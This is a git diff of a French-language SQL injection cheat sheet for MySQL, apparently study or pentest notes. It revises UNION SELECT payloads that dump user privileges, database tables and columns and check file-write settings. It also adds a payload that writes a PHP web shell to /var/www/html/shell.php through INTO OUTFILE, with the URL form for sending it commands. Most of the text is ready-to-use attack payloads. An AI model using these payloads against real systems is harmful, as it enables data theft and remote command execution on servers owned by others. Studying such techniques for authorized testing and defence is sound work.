@@ -4,6 +4,7 @@
 ![Types d'injection sql](../Ressources/IMG/types_of_sqli.jpg)
 * L'injection sql commence toujours avec : **'**
 dans le but d'escape 
+* **Le select dépend toujours du nombre de colonne**
 
 |Payload | URL Encoded | commentaire|
 |--|--|-- |
@@ -30,11 +31,11 @@ select user() |  current_user
 # privilege 
 SELECT super_priv FROM mysql.user
 # si on a plusieurs utilisateurs , on ajoute le where
-cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+cn' UNION SELECT super_priv FROM mysql.user WHERE user="<UserName>"-- -
 
 # dump other privileges 
 # ajouter where quand il y'a plusieurs users
-cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+cn' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges-- -
 
 ```
 ---
@@ -87,13 +88,13 @@ SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 #### List des tables dans la base de données
 * utilisation de **TABLE_NAME** et **TABLE_SCHEMA** dans **INFORMATION_SCHEMA.TABLES**
 ```sql
-cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<dbName>'-- -
+cn' UNION select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='<dbName>'-- -
 ```
 
 #### List des colonne d'une table dans la base de données
 * utilisation de **COLUMN_NAME** **TABLE_NAME** **TABLE_SCHEMA** dans **INFORMATION_SCHEMA.COLUMNS**
 ```sql
-cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<NameOfTable>'-- -
+cn' UNION select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<NameOfTable>'-- -
 ```
 
 ----
@@ -116,7 +117,7 @@ SELECT LOAD_FILE('</etc/passwd | Path>');
 
     SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
 
-    cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+    cn' UNION SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
     ```
 
 * Write access to the location we want to write to on the back-end server
@@ -131,7 +132,12 @@ SELECT <Element> from <tableName> INTO OUTFILE '<OutPutPath>'; # ex: SELECT 'thi
 
 ```sql
 # exemple
-cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+cn' union select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -
+```
+
+pour avoir accès au shell, on utilise
+```bash
+<URLFilePath>?0=<cmd>
 ```
 
 ----
